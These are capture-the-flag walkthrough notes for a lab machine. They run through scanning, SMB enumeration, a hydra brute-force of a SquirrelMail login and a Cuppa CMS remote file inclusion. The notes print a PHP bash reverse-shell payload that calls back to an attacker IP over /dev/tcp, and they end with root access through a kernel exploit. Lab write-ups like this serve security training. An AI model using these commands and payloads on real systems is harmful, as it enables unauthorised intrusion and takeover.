export ip=10.10.235.41

# recon and # scanning

## tool - nmap
- `nmap -sV -sC -oN nmap.log $ip`
  - 22 ssh, 80 http, 110 pop3, 139 netbios, 143 imap, 445 netbios smbd 4.3.11-Ubuntu
- `sudo nmap -O $ip`
  - NA

## tool - gobuster
- `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip | tee gobuster.log`
  - Found many directories which are returning 403 errors except for a squirrel mail dir. Accessed this url and found installation of a [vulnerable version of squirrelmail](https://www.exploit-db.com/exploits/27948)
  - 
## tool - enum4linux
- `enum4linux -a $ip | tee enum4linux.log`
  - got a username: milesdyson

## tool - hydra
- Considering we got a username and a webmail installation, the obvious next step is trying to use hydra on this.
  - `hydra -l milesdyson -P smb/logs/log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect."`


# Process
- Considering we have many samba shares with anonymous access, we can try accessing those.
  - `smbclient //10.10.235.41/anonymous`
  - There are many files, so let's download all those
  - `smbget -R smb://10.10.235.41/anonymous`
  - In one of the downloaded files, we can see many password like strings, so we can use that with hydra to get into squirrelmail.
  - And this gets us the password for milesdyson
  - After logging into the email, we can see one of the email is having skynets smb password
  - with this password we can login to the smb share of miles dyson
    - `smbclient //10.10.235.41/milesdyson --user=milesdyson --workgroup=skynet`
  - under this share, you can see a notes dir which has another file. This file mentions the url of a CMD they are adding features to. 
  - running gobuster on that url returns an administrator url
    - `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://10.10.235.41/45kra24zxs28v3yd/ | tee gobuster-cms.log`
  - this administrator is running a CMS called cuppa, so searching for any available exploits, https://www.exploit-db.com/exploits/25971
  - As it is mentioned in the exploit, we can access the config file which has the username and password for cuppa.
  - Also this exploit lets us do remote file inclusion which in turn can give us a reverse shell
    - adding `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/1234 0>&1'"); ?>` in a php file and starting a webserver using python to serve this file.
    - then access the url `$ip/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.25.169/rs.php?` to get the reverse shell
    - going to the home dir of milesdyson we get the first flag
  - downloaded linpeas.sh from local webserver using wget, and found the system is vulnerable to this [exploit](https://www.exploit-db.com/exploits/45010)
  - exploited successfully to get the root shell
